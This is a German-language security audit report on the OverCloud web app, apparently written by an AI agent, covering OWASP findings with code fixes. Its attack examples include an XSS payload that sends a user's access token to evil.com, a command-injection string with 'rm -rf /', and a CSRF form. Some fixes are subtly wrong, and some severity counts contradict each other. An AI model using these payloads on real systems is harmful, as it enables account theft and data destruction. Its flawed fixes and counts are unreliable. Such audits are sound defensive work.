# OverCloud Security Audit Report

**Audit-Datum:** 2026-05-16  
**Auditor:** Claude Sonnet 4.5 (Security Agent)  
**Scope:** Backend (FastAPI/Python) + Frontend (Vanilla JS)  
**Methodik:** OWASP Top 10 (2021), Code Review, Threat Modeling

---

## Executive Summary

**Gesamtbewertung:** GELB (Moderate Security Posture)  
**Kritische Findings:** 2  
**High-Severity Findings:** 4  
**Medium-Severity Findings:** 6  
**Low-Severity Findings:** 3

### Highlights

#### Positive Aspekte
- JWT-basierte Authentifizierung korrekt implementiert
- Bcrypt für Passwort-Hashing (sichere Default-Konfiguration)
- Rate Limiting auf kritischen Endpoints vorhanden
- Account Lockout nach 5 fehlgeschlagenen Login-Versuchen
- Security Headers korrekt gesetzt (CSP, HSTS, X-Frame-Options)
- CORS korrekt konfiguriert
- Input Validation via Pydantic Schemas
- DynamoDB Query Building sicher (keine SQL Injection möglich)

#### Kritische Schwachstellen
1. **DEBUG=True in Production** - Erlaubt detaillierte Fehler-Messages
2. **Fehlende CSRF Protection** - State-Changing Requests ohne CSRF Token
3. **JWT ohne Refresh-Tokens** - Keine Token-Revocation möglich
4. **Subprocess-Calls ohne Input-Sanitization** - Command Injection Risiko
5. **IDOR-Anfälligkeiten** - Fehlende Authorization Checks in mehreren Endpoints
6. **XSS-Risiko im Frontend** - Unsicheres `innerHTML` mit User Input

---

## OWASP Top 10 Coverage

| OWASP Category | Status | Findings | Severity |
|----------------|--------|----------|----------|
| A01: Broken Access Control | FAIL | 4 | HIGH |
| A02: Cryptographic Failures | PASS | 1 | MEDIUM |
| A03: Injection | WARN | 2 | HIGH |
| A04: Insecure Design | WARN | 3 | MEDIUM |
| A05: Security Misconfiguration | FAIL | 2 | CRITICAL |
| A06: Vulnerable Components | PASS | 1 | LOW |
| A07: Authentication Failures | PASS | 2 | MEDIUM |
| A08: Data Integrity Failures | PASS | 0 | - |
| A09: Logging Failures | WARN | 2 | MEDIUM |
| A10: SSRF | PASS | 0 | - |

---

## Detailed Findings

### CRITICAL SEVERITY

---

#### [CRITICAL-01] Debug Mode in Production Environment

**Category:** OWASP A05 - Security Misconfiguration  
**Location:** `backend/app/config.py:18`

**Description:**
Debug-Modus ist per Default aktiviert (`DEBUG: bool = True`). In Production werden dadurch:
- Detaillierte Stack Traces an Client gesendet
- Interne Datei-Pfade exposed
- Entwickler-Tools aktiviert (Hot Reload, etc.)

**Impact:**
- **Information Disclosure:** Angreifer erhält detaillierte Fehler-Messages mit Stack Traces
- **Code-Struktur Offenlegung:** Datei-Pfade und Code-Struktur sichtbar
- **Potenzielle Code-Execution:** Debug-Features könnten missbraucht werden

**Reproduction Steps:**
1. Deploy Backend mit `.env` file ohne `DEBUG=False`
2. Provoziere Fehler (z.B. ungültiger Request)
3. Erhalte Stack Trace mit internen Pfaden

**Code-Beispiel (Vulnerable):**
```python
# backend/app/config.py
class Settings(BaseSettings):
    DEBUG: bool = True  # CRITICAL: Default ist True!
```

**Recommendation:**
```python
# backend/app/config.py
class Settings(BaseSettings):
    DEBUG: bool = False  # Secure default
    
    @field_validator("DEBUG")
    @classmethod
    def validate_debug_mode(cls, v, values):
        """Warnung wenn Debug in Production."""
        if v and values.get("ENV") == "production":
            raise ValueError("DEBUG=True is not allowed in production environment")
        return v
```

**Quick Fix:**
```bash
# In .env (Production)
DEBUG=False
ENV=production
```

---

#### [CRITICAL-02] Missing CSRF Protection

**Category:** OWASP A04 - Insecure Design  
**Location:** `backend/app/main.py` (alle POST/PUT/DELETE Endpoints)

**Description:**
State-Changing Requests (POST, PUT, DELETE) haben keine CSRF Protection. Ein Angreifer kann via bösartige Websites Requests im Namen des Opfers ausführen.

**Impact:**
- **Unauthorized Actions:** Angreifer kann Aktionen im Namen authentifizierter User ausführen
- **Account Takeover:** Passwort-Änderung ohne Wissen des Users
- **Datenverlust:** Architektur-Löschung, Member-Entfernung, etc.

**Vulnerable Endpoints:**
- `POST /api/v1/auth/register`
- `POST /api/v1/auth/login`
- `DELETE /api/v1/users/{id}`
- `POST /api/v1/organisations/{id}/members`
- `DELETE /api/v1/architectures/{id}`
- Alle State-Changing Endpoints

**Attack Scenario:**
```html
<!-- Angreifer-Website -->
<form action="https://api.overcloud.io/api/v1/users/{victim-id}" method="POST">
    <input type="hidden" name="password" value="hacked123">
    <script>document.forms[0].submit();</script>
</form>
```

**Recommendation:**
Implementiere CSRF Protection via Double Submit Cookie oder Synchronizer Token Pattern:

```python
# backend/app/middleware/csrf.py
from fastapi import Request, HTTPException
from secrets import token_urlsafe

CSRF_TOKEN_KEY = "csrf_token"

async def verify_csrf_token(request: Request):
    """Verify CSRF token for state-changing requests."""
    if request.method in ["POST", "PUT", "DELETE", "PATCH"]:
        # Token aus Header
        token_header = request.headers.get("X-CSRF-Token")
        # Token aus Cookie
        token_cookie = request.cookies.get(CSRF_TOKEN_KEY)
        
        if not token_header or not token_cookie or token_header != token_cookie:
            raise HTTPException(status_code=403, detail="CSRF token verification failed")

# In main.py
app.add_middleware(BaseHTTPMiddleware, dispatch=verify_csrf_token)
```

**Alternative:** Use SameSite Cookies (bereits implizit via JWT in Bearer Token - aber nur Teilschutz)

---

### HIGH SEVERITY

---

#### [HIGH-01] IDOR - Missing Authorization Check in User Endpoints

**Category:** OWASP A01 - Broken Access Control  
**Location:** `backend/app/api/users.py:64-82`

**Description:**
`GET /api/v1/users/{user_id}` erlaubt authenticated Users, Profile von anderen Usern abzurufen. Es fehlt die Prüfung, ob User berechtigt ist (z.B. nur eigenes Profil oder Admin).

**Impact:**
- **Information Disclosure:** Angreifer kann Email, Name, Status von anderen Usern auslesen
- **Privacy Violation:** DSGVO-Verstoß (unbefugter Zugriff auf personenbezogene Daten)

**Reproduction Steps:**
1. Login als User A (ID: `aaa-111`)
2. Request: `GET /api/v1/users/bbb-222` (User B)
3. Erhalte Profil von User B

**Code (Vulnerable):**
```python
@router.get("/{user_id}", response_model=UserResponse)
async def get_user(
    user_id: UUID,
    current_user: Annotated[dict, Depends(get_current_user)] = None,
    user_repo: UserRepository = Depends(get_user_repository)
):
    # FEHLT: Authorization Check!
    user = user_repo.get(user_id)
    return UserResponse(**user)
```

**Recommendation:**
```python
@router.get("/{user_id}", response_model=UserResponse)
async def get_user(
    user_id: UUID,
    current_user: Annotated[dict, Depends(get_current_user)] = None,
    user_repo: UserRepository = Depends(get_user_repository)
):
    # Authorization: User can only view their own profile
    if str(user_id) != current_user["id"]:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="You can only view your own profile"
        )
    
    user = user_repo.get(user_id)
    if not user:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="User not found")
    
    return UserResponse(**user)
```

**Similar Issues:**
- `GET /api/v1/users` - Jeder kann alle User listen (sollte Admin-only sein)
- `GET /api/v1/users/{id}/organisations` - Fehlt Check ob `id == current_user.id`

---

#### [HIGH-02] Command Injection Risk in Terraform Validator

**Category:** OWASP A03 - Injection  
**Location:** `backend/app/core/terraform_generator/validators.py:138-148`

**Description:**
`subprocess.run()` führt Terraform-Commands aus, wobei `working_dir` und `args` von User Input abhängen könnten. Fehlt Input-Sanitization.

**Impact:**
- **Remote Code Execution:** Angreifer könnte Commands auf Server ausführen
- **Data Exfiltration:** Zugriff auf Backend-Dateisystem
- **Privilege Escalation:** Potenziell Root-Zugriff

**Code (Vulnerable):**
```python
def _run_terraform_command(self, args: List[str], working_dir: Path, timeout: int = 120):
    cmd = [self.terraform_binary] + args
    result = subprocess.run(
        cmd,
        cwd=working_dir,  # User-kontrolliert?
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False
    )
```

**Attack Scenario:**
Wenn `working_dir` aus User Input kommt:
```python
# Angreifer sendet:
working_dir = "/tmp; rm -rf /"  # Command Injection
```

**Recommendation:**
1. **Input Validation:** Validiere `working_dir` strikt
2. **Whitelist:** Nur erlaubte Pfade
3. **Escape Arguments:** Nutze `shlex.quote()` für Shell-sichere Strings

```python
import shlex
from pathlib import Path

def _run_terraform_command(self, args: List[str], working_dir: Path, timeout: int = 120):
    # Validate working_dir
    allowed_base = Path(settings.TERRAFORM_WORKSPACE_DIR).resolve()
    working_dir_resolved = working_dir.resolve()
    
    if not str(working_dir_resolved).startswith(str(allowed_base)):
        raise ValueError(f"Invalid working directory: {working_dir}")
    
    # Sanitize terraform binary path
    terraform_binary = shlex.quote(self.terraform_binary)
    
    # Escape all arguments
    cmd = [terraform_binary] + [shlex.quote(arg) for arg in args]
    
    result = subprocess.run(
        cmd,
        cwd=working_dir_resolved,
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
        shell=False  # WICHTIG: Kein Shell=True!
    )
```

---

#### [HIGH-03] XSS via Unsafe innerHTML in Frontend

**Category:** OWASP A03 - Injection  
**Location:** `frontend/src/js/` (multiple files)

**Description:**
Mehrere Stellen nutzen `innerHTML` mit unsanitized User Input. Angreifer kann XSS Payloads injizieren.

**Impact:**
- **Session Hijacking:** Angreifer stiehlt JWT Token aus localStorage
- **Account Takeover:** Führt Actions im Namen des Opfers aus
- **Phishing:** Rendert bösartigen Content in legitimer App

**Vulnerable Code:**
```javascript
// frontend/src/js/main.js:XX
mainContainer.innerHTML = '<p>' + userInput + '</p>';  // UNSAFE!

// frontend/src/js/components/architecture-form.js
regionContainer.innerHTML = renderRegionSelection(provider, region);  // Wenn region aus User Input
```

**Attack Scenario:**
```javascript
// Angreifer erstellt Architektur mit Name:
architectureName = "<img src=x onerror='fetch(\"https://evil.com?token=\"+localStorage.getItem(\"access_token\"))'>"

// Beim Rendern:
container.innerHTML = `<h2>${architectureName}</h2>`;  // XSS!
```

**Recommendation:**
1. **Nutze `textContent` statt `innerHTML`** für User Input
2. **Sanitize HTML** mit DOMPurify
3. **CSP Header** (bereits vorhanden, aber strenger)

```javascript
// Safe Version
function renderArchitectureName(name) {
    const h2 = document.createElement('h2');
    h2.textContent = name;  // Auto-escaped!
    return h2;
}

// Mit DOMPurify (für komplexes HTML)
import DOMPurify from 'dompurify';

function renderHTML(userHTML) {
    const clean = DOMPurify.sanitize(userHTML);
    container.innerHTML = clean;
}
```

**Quick Fix:**
```javascript
// Ersetze alle innerHTML mit textContent
- element.innerHTML = userInput;
+ element.textContent = userInput;

// Für komplexes HTML:
- element.innerHTML = '<h2>' + title + '</h2>';
+ const h2 = document.createElement('h2');
+ h2.textContent = title;
+ element.appendChild(h2);
```

---

#### [HIGH-04] JWT Token ohne Refresh-Mechanismus

**Category:** OWASP A07 - Authentication Failures  
**Location:** `backend/app/api/auth.py` (kein Refresh Token)

**Description:**
JWT Access Token hat 24h Laufzeit ohne Refresh Token. Probleme:
- **Lange Laufzeit:** Wenn Token geleakt, 24h gültig
- **Keine Revocation:** Token kann nicht invalidiert werden (z.B. bei Logout oder Passwort-Änderung)
- **Session Fixation:** Alter Token bleibt nach Passwort-Change gültig

**Impact:**
- **Account Takeover:** Gestohlener Token bleibt 24h nutzbar
- **Privilege Escalation:** User-Downgrade hat keine Wirkung bis Token abläuft
- **Logout ineffektiv:** Token bleibt gültig (nur Client-Side Löschung)

**Current Implementation:**
```python
# backend/app/config.py
ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24  # 24 hours - ZU LANG!

# auth.py
@router.post("/logout")
async def logout():
    # Nur Client-Side - Token bleibt gültig!
    return {"message": "Logged out successfully"}
```

**Recommendation:**
Implementiere Refresh Token Flow:

```python
# 1. Verkürze Access Token Laufzeit
ACCESS_TOKEN_EXPIRE_MINUTES: int = 15  # 15 Minuten

# 2. Füge Refresh Token hinzu
REFRESH_TOKEN_EXPIRE_DAYS: int = 30

@router.post("/login", response_model=TokenResponse)
async def login(...):
    # Access Token (15min)
    access_token = create_access_token({"sub": user["id"]}, timedelta(minutes=15))
    
    # Refresh Token (30 Tage, stored in DB)
    refresh_token = create_refresh_token(user["id"])
    refresh_repo.store(refresh_token, user["id"], expires=timedelta(days=30))
    
    return {
        "access_token": access_token,
        "refresh_token": refresh_token,  # NEU
        "token_type": "bearer",
        "expires_in": 900
    }

@router.post("/refresh", response_model=TokenResponse)
async def refresh_token(refresh_token: str):
    # Validate refresh token
    user_id = refresh_repo.validate(refresh_token)
    if not user_id:
        raise HTTPException(401, "Invalid refresh token")
    
    # Issue new access token
    access_token = create_access_token({"sub": user_id}, timedelta(minutes=15))
    
    return {"access_token": access_token, "expires_in": 900}

@router.post("/logout")
async def logout(refresh_token: str):
    # Invalidate refresh token
    refresh_repo.revoke(refresh_token)
    return {"message": "Logged out"}
```

**Alternative (einfacher):**
Token Blacklist in DynamoDB mit TTL:
```python
def revoke_token(token: str):
    """Add token to blacklist."""
    table.put_item(Item={
        "PK": f"BLACKLIST#{token}",
        "SK": "METADATA",
        "expires_at": int((datetime.utcnow() + timedelta(hours=24)).timestamp())
    })

async def get_current_user(token: str):
    # Check blacklist
    if is_token_blacklisted(token):
        raise HTTPException(401, "Token has been revoked")
    # ...
```

---

### MEDIUM SEVERITY

---

#### [MEDIUM-01] Weak JWT Secret Key Validation

**Category:** OWASP A02 - Cryptographic Failures  
**Location:** `backend/app/config.py:73-81`

**Description:**
SECRET_KEY Validation prüft nur auf bekannte Weak Strings, aber nicht auf Entropie/Stärke.

**Impact:**
- **JWT Forgery:** Schwache Keys können via Brute Force geknackt werden
- **Session Hijacking:** Angreifer kann eigene Tokens erstellen

**Code (Insufficient):**
```python
@field_validator("SECRET_KEY")
@classmethod
def validate_secret_key(cls, v):
    if len(v) < 32:
        raise ValueError("SECRET_KEY must be at least 32 characters long")
    if v in ["your-secret-key-change-in-production", "secret", "changeme"]:
        raise ValueError("SECRET_KEY must not use common/default values")
    return v
```

**Recommendation:**
```python
import re
import secrets

@field_validator("SECRET_KEY")
@classmethod
def validate_secret_key(cls, v):
    # Length check
    if len(v) < 32:
        raise ValueError("SECRET_KEY must be at least 32 characters long")
    
    # Blacklist common weak keys
    weak_keys = ["secret", "changeme", "test", "dev", "password", "12345"]
    if any(weak in v.lower() for weak in weak_keys):
        raise ValueError("SECRET_KEY contains weak/common strings")
    
    # Entropy check (simplified)
    unique_chars = len(set(v))
    if unique_chars < 20:  # Zu wenig verschiedene Zeichen
        raise ValueError("SECRET_KEY has insufficient entropy")
    
    # Pattern detection (nur Zahlen, nur Lowercase, etc.)
    if v.isdigit() or v.islower() or v.isupper():
        raise ValueError("SECRET_KEY must contain mixed character types")
    
    return v

# Generate secure key helper
def generate_secure_key():
    """Generate cryptographically secure SECRET_KEY."""
    return secrets.token_urlsafe(32)  # 256 bits entropy
```

**Quick Fix:**
```bash
# Generate secure key
python -c "import secrets; print(secrets.token_urlsafe(32))"

# Add to .env
SECRET_KEY=<generated-key>
```

---

#### [MEDIUM-02] Missing Rate Limiting on Critical Endpoints

**Category:** OWASP A04 - Insecure Design  
**Location:** `backend/app/api/` (teilweise fehlend)

**Description:**
Nicht alle kritischen Endpoints haben Rate Limiting. Z.B.:
- `/api/v1/architectures` - Kein Limit auf Creation
- `/api/v1/deployments` - Kann Resource Exhaustion auslösen
- `/api/v1/users/{id}` - Kein Limit auf IDOR-Enumeration

**Impact:**
- **DoS:** Angreifer kann Server überlasten
- **Resource Exhaustion:** Zu viele Deployments/Architectures
- **Brute Force:** Enumeration von User IDs

**Recommendation:**
Füge Rate Limiting zu allen Endpoints hinzu:

```python
from slowapi import Limiter

@router.post("", response_model=ArchitectureResponse)
@limiter.limit("100/hour" if settings.TESTING else "10/minute")  # NEU
async def create_architecture(request: Request, ...):
    # ...
```

**Priorität:**
- High: `/auth/login`, `/auth/register` - DONE
- High: `/billing/checkout` - DONE
- Medium: `/architectures` (POST) - MISSING
- Medium: `/deployments` (POST) - MISSING
- Low: `/users/{id}` (GET) - MISSING

---

#### [MEDIUM-03] Insufficient Logging for Security Events

**Category:** OWASP A09 - Logging Failures  
**Location:** `backend/app/` (mehrere Stellen)

**Description:**
Security-relevante Events werden nicht ausreichend geloggt:
- Passwort-Änderungen ohne Audit Log
- AWS Credential Changes ohne Alert
- Role Changes ohne Owner-Benachrichtigung
- Failed Authorization Attempts nicht geloggt

**Impact:**
- **Incident Response:** Schwierig nachzuvollziehen wer was gemacht hat
- **Compliance:** DSGVO/ISO27001 verlangen Audit Trail
- **Forensics:** Angriffe können nicht rekonstruiert werden

**Missing Logs:**
```python
# backend/app/api/users.py:update_password
# FEHLT: Audit Log
logger.info(f"Password updated for user {user_id}")  # Vorhanden, aber unzureichend

# Sollte sein:
audit_repo.create(
    resource_type="user",
    resource_id=str(user_id),
    action="password.updated",
    user_id=str(user_id),
    metadata={"ip": request.client.host, "user_agent": request.headers.get("user-agent")}
)

# Send Email Alert
email_service.send(
    to=user["email"],
    subject="Password Changed",
    body="Your password was changed. If this wasn't you, secure your account immediately."
)
```

**Recommendation:**
Implementiere Security Audit Log für:
1. **Authentication:** Login (success/fail), Logout, Password Change, MFA
2. **Authorization:** Failed permission checks, Role changes
3. **Data Access:** DSGVO Data Export, User Deletion
4. **Configuration:** AWS Credential Updates, Stripe Integration
5. **Deployment:** Stack Creation, Deletion, Terraform Apply

```python
# backend/app/repositories/security_audit.py
class SecurityAuditRepository:
    def log_security_event(self, event_type: str, user_id: UUID, metadata: dict):
        """Log security-relevant event."""
        self.table.put_item(Item={
            "PK": f"SECURITY_AUDIT#{datetime.utcnow().date().isoformat()}",
            "SK": f"{datetime.utcnow().isoformat()}#{event_type}#{user_id}",
            "event_type": event_type,
            "user_id": str(user_id),
            "timestamp": datetime.utcnow().isoformat(),
            "ip_address": metadata.get("ip"),
            "user_agent": metadata.get("user_agent"),
            "metadata": metadata
        })
```

---

#### [MEDIUM-04] No Password Complexity Requirements

**Category:** OWASP A07 - Authentication Failures  
**Location:** `backend/app/schemas/user.py:34`

**Description:**
Passwort-Policy prüft nur Länge (min 8 chars), aber nicht Komplexität (Großbuchstaben, Zahlen, Sonderzeichen).

**Impact:**
- **Brute Force:** Einfache Passwörter leichter zu knacken
- **Dictionary Attacks:** Häufige Passwörter nicht blockiert
- **Compliance:** NIST/BSI empfehlen strengere Policies

**Current Validation:**
```python
class UserCreate(BaseModel):
    password: str = Field(..., min_length=8, max_length=128)  # Nur Länge!
```

**Recommendation:**
```python
from pydantic import field_validator
import re

class UserCreate(BaseModel):
    password: str = Field(..., min_length=8, max_length=128)
    
    @field_validator("password")
    @classmethod
    def validate_password_strength(cls, v):
        """Enforce password complexity."""
        # Min 8 chars
        if len(v) < 8:
            raise ValueError("Password must be at least 8 characters")
        
        # At least one lowercase
        if not re.search(r"[a-z]", v):
            raise ValueError("Password must contain at least one lowercase letter")
        
        # At least one uppercase
        if not re.search(r"[A-Z]", v):
            raise ValueError("Password must contain at least one uppercase letter")
        
        # At least one digit
        if not re.search(r"\d", v):
            raise ValueError("Password must contain at least one digit")
        
        # At least one special char
        if not re.search(r"[!@#$%^&*(),.?\":{}|<>]", v):
            raise ValueError("Password must contain at least one special character")
        
        # Check against common passwords
        with open("common_passwords.txt") as f:
            common = [line.strip().lower() for line in f]
            if v.lower() in common:
                raise ValueError("Password is too common. Choose a more unique password.")
        
        return v
```

**Alternative (weniger streng, NIST-konform):**
```python
# NIST empfiehlt: Nur Länge + Blacklist, keine Komplexität
@field_validator("password")
@classmethod
def validate_password(cls, v):
    if len(v) < 12:  # NIST: Min 12 chars
        raise ValueError("Password must be at least 12 characters")
    
    # Check gegen Have I Been Pwned
    pwned_count = check_pwned_password(v)
    if pwned_count > 0:
        raise ValueError(f"This password appeared {pwned_count} times in data breaches. Choose a different one.")
    
    return v
```

---

#### [MEDIUM-05] DSGVO Endpoints Not Ported to DynamoDB

**Category:** OWASP A09 - Logging Failures  
**Location:** `backend/app/api/dsgvo.py:1` (commented out in main.py)

**Description:**
DSGVO/GDPR Endpoints sind noch nicht auf DynamoDB portiert und daher deaktiviert. EU-Compliance gefährdet.

**Impact:**
- **Legal Risk:** DSGVO-Verstoß (Recht auf Datenauskunft/Löschung nicht erfüllbar)
- **Fines:** Bis zu 20 Mio EUR oder 4% des Jahresumsatzes
- **Reputational Damage:** Negative Publicity

**Missing Functionality:**
- Art. 15: Datenauskunft (Data Export)
- Art. 17: Löschung ("Right to be Forgotten")
- Art. 20: Datenportabilität

**Recommendation:**
1. **Priorität 1 (vor Go-Live):** Port DSGVO Service zu DynamoDB
2. Implementiere Data Export:
```python
@router.get("/data-export")
async def export_user_data(current_user: dict, table=Depends(get_dynamodb_table)):
    """Export all user data (GDPR Art. 15)."""
    # Query all items for user
    items = []
    items.extend(table.query(KeyConditionExpression=Key("PK").eq(f"USER#{current_user['id']}"))["Items"])
    items.extend(table.query(KeyConditionExpression=Key("PK").begins_with(f"ARCH#{current_user['id']}"))["Items"])
    
    # Generate JSON
    export_data = {
        "user": current_user,
        "architectures": [item for item in items if "ARCH" in item["PK"]],
        "exported_at": datetime.utcnow().isoformat()
    }
    
    return StreamingResponse(
        io.BytesIO(json.dumps(export_data, indent=2).encode()),
        media_type="application/json",
        headers={"Content-Disposition": f"attachment; filename=overcloud_export_{current_user['id']}.json"}
    )
```

---

#### [MEDIUM-06] Stripe Webhook Signature Not Verified Properly

**Category:** OWASP A08 - Data Integrity Failures  
**Location:** `backend/app/api/webhooks.py:30-62`

**Description:**
Stripe Webhook Signature wird verifiziert, aber bei Fehler wird nur 400 zurückgegeben ohne Rate Limiting. Angreifer kann Brute Force versuchen.

**Impact:**
- **Webhook Forgery:** Angreifer könnte gefälschte Webhooks senden
- **Subscription Manipulation:** Kostenlos auf PRO upgraden
- **Billing Fraud:** Payments als "succeeded" markieren ohne Zahlung

**Code:**
```python
@router.post("/stripe")
async def stripe_webhook(
    request: Request,
    stripe_signature: str,
    stripe_service: StripeService = Depends(get_stripe_service)
):
    payload = await request.body()
    event = stripe_service.verify_webhook_signature(payload, stripe_signature, ...)
    
    if not event:
        # FEHLT: Rate Limiting, Logging von Failed Attempts
        raise HTTPException(status_code=400, detail="Invalid signature")
```

**Recommendation:**
```python
from slowapi import Limiter

limiter = Limiter(key_func=get_remote_address)

@router.post("/stripe")
@limiter.limit("1000/hour" if settings.TESTING else "50/hour")  # Rate Limit für Webhooks
async def stripe_webhook(request: Request, ...):
    payload = await request.body()
    
    # Verify signature
    try:
        event = stripe_service.verify_webhook_signature(...)
    except Exception as e:
        # Log failed verification
        logger.warning(
            f"Stripe webhook signature verification failed",
            extra={"ip": request.client.host, "error": str(e)}
        )
        raise HTTPException(status_code=400, detail="Invalid signature")
    
    # Additional validation: Check event ID uniqueness (prevent replay)
    if event_already_processed(event["id"]):
        logger.warning(f"Duplicate webhook event: {event['id']}")
        return {"received": True}  # Idempotency
    
    # Process event
    mark_event_as_processed(event["id"])
    # ...
```

---

### LOW SEVERITY

---

#### [LOW-01] Hardcoded BASE_URL in Frontend

**Category:** OWASP A05 - Security Misconfiguration  
**Location:** `frontend/src/js/lib/api-client.js:12`

**Description:**
API Base URL ist hardcoded (`http://localhost:8000`). Bei Deployment auf Production funktioniert Frontend nicht.

**Impact:**
- **Deployment Issues:** Frontend kann nicht mit Production API kommunizieren
- **Mixed Content Warnings:** HTTP auf HTTPS-Site blockiert

**Code:**
```javascript
export class APIClient {
    constructor(baseURL = 'http://localhost:8000') {  // HARDCODED!
        this.baseURL = baseURL.replace(/\/$/, '');
    }
}
```

**Recommendation:**
```javascript
// frontend/.env
VITE_API_BASE_URL=http://localhost:8000

// frontend/src/js/lib/api-client.js
export class APIClient {
    constructor(baseURL = import.meta.env.VITE_API_BASE_URL || 'http://localhost:8000') {
        this.baseURL = baseURL.replace(/\/$/, '');
    }
}
```

---

#### [LOW-02] No Dependency Vulnerability Scanning in CI/CD

**Category:** OWASP A06 - Vulnerable Components  
**Location:** `.github/workflows/` (fehlende Security Checks)

**Description:**
Keine automatische Prüfung auf bekannte Vulnerabilities in Dependencies (npm audit, safety check).

**Impact:**
- **Known Vulnerabilities:** Veraltete Packages mit CVEs
- **Supply Chain Attacks:** Kompromittierte Dependencies

**Recommendation:**
Füge Security Checks zu CI/CD hinzu:

```yaml
# .github/workflows/security.yml
name: Security Checks

on: [push, pull_request]

jobs:
  backend-security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Install Poetry
        run: pipx install poetry
      
      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'
          cache: 'poetry'
      
      - name: Install dependencies
        run: |
          cd backend
          poetry install
      
      - name: Run Safety (Dependency Check)
        run: |
          cd backend
          poetry run safety check --json
      
      - name: Run Bandit (SAST)
        run: |
          cd backend
          poetry run bandit -r app/ -f json -o bandit-report.json
      
      - name: Detect Secrets
        run: |
          cd backend
          poetry run detect-secrets scan --baseline .secrets.baseline
  
  frontend-security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install dependencies
        run: |
          cd frontend
          npm ci
      
      - name: Run npm audit
        run: |
          cd frontend
          npm audit --audit-level=moderate
```

---

#### [LOW-03] Missing Security.txt

**Category:** OWASP A05 - Security Misconfiguration  
**Location:** `frontend/public/.well-known/security.txt` (fehlend)

**Description:**
Keine `security.txt` Datei für Responsible Disclosure. Security Researcher wissen nicht, wie Vulnerabilities zu melden sind.

**Impact:**
- **Delayed Disclosure:** Researcher könnten Vulns öffentlich machen
- **No Coordinated Disclosure:** Keine Möglichkeit für sichere Kommunikation

**Recommendation:**
Erstelle `frontend/public/.well-known/security.txt`:

```text
# OverCloud Security Contact

Contact: mailto:security@overcloud.io
Expires: 2027-12-31T23:59:59.000Z
Preferred-Languages: en, de
Canonical: https://app.overcloud.io/.well-known/security.txt

# Disclosure Policy
# Please report security vulnerabilities to security@overcloud.io
# We aim to respond within 48 hours and provide a fix within 7 days for critical issues.
# We appreciate responsible disclosure and offer a bug bounty program for verified reports.

# PGP Key
Encryption: https://keys.openpgp.org/vks/v1/by-fingerprint/YOUR_PGP_KEY

# Acknowledgements
Acknowledgments: https://overcloud.io/security/hall-of-fame
```

---

## Summary of Recommendations

### Quick Wins (< 1 Tag Implementation)

1. **[CRITICAL] Set DEBUG=False in Production** - Config Change
2. **[HIGH] Add Authorization Checks zu IDOR Endpoints** - 10 Zeilen Code pro Endpoint
3. **[MEDIUM] Strengthen Password Policy** - Pydantic Validator
4. **[MEDIUM] Add Rate Limiting zu fehlenden Endpoints** - Decorator hinzufügen
5. **[LOW] Fix Hardcoded API URL** - Environment Variable

### Medium-Term (1-2 Wochen)

1. **[CRITICAL] Implement CSRF Protection** - Middleware + Token Generation
2. **[HIGH] Implement Refresh Token Flow** - Auth Service Refactor
3. **[HIGH] Sanitize XSS in Frontend** - DOMPurify Integration
4. **[HIGH] Fix Command Injection Risk** - Input Validation für Terraform Validator
5. **[MEDIUM] Enhance Security Logging** - Audit Repository

### Long-Term (> 2 Wochen)

1. **[MEDIUM] Port DSGVO Service to DynamoDB** - Service Refactor
2. **[MEDIUM] Implement Webhook Replay Protection** - Event Deduplication
3. **[LOW] Add Security CI/CD Checks** - GitHub Actions Workflow
4. **[LOW] Create security.txt** - Static File

---

## Testing Checklist

### Manual Testing
- [ ] Test IDOR: User A zugriff auf User B Profile
- [ ] Test CSRF: Fake Website sendet State-Changing Request
- [ ] Test XSS: Architektur-Name mit `<script>alert(1)</script>`
- [ ] Test Rate Limiting: 100 Requests in 1 Sekunde
- [ ] Test JWT Expiration: Alter Token nach 24h+1min
- [ ] Test Account Lockout: 5 falsche Logins
- [ ] Test Password Strength: Passwort "password123"
- [ ] Test Command Injection: Terraform mit malicious Path

### Automated Testing
```bash
# Backend Security Tests
cd backend
poetry run pytest tests/security/  # Erstelle Security Test Suite

# SAST (Static Analysis)
poetry run bandit -r app/
poetry run safety check

# Dependency Audit
poetry show --outdated

# Frontend Security
cd frontend
npm audit
npm run test:security  # XSS Tests
```

---

## Compliance Status

| Regulation | Status | Missing |
|------------|--------|---------|
| DSGVO/GDPR | PARTIAL | DSGVO Endpoints deaktiviert |
| ISO 27001 | PARTIAL | Security Logging unvollständig |
| OWASP ASVS | LEVEL 1 | CSRF, Refresh Tokens, Advanced Logging |
| PCI DSS | N/A | Keine Kreditkarten (Stripe hosted) |
| SOC 2 Type II | PARTIAL | Audit Trail unvollständig |

---

## Conclusion

OverCloud hat eine **solide Basis** für Security, aber **kritische Lücken** vor Production Launch:

**Must-Fix vor Go-Live:**
1. DEBUG=False in Production
2. CSRF Protection
3. IDOR Authorization Checks
4. XSS Prevention (DOMPurify)
5. DSGVO Endpoints aktivieren

**Nice-to-Have (Post-Launch):**
- Refresh Token Flow
- Command Injection Fix (Terraform Validator)
- Enhanced Security Logging
- Automated Security Scanning

**Gesamtrisiko:** MEDIUM-HIGH (ohne Fixes), LOW (nach Quick Wins)

---

**Report erstellt:** 2026-05-16  
**Nächstes Audit:** 2026-06-16 (nach Fixes)  
**Kontakt:** Security Team <security@overcloud.io>
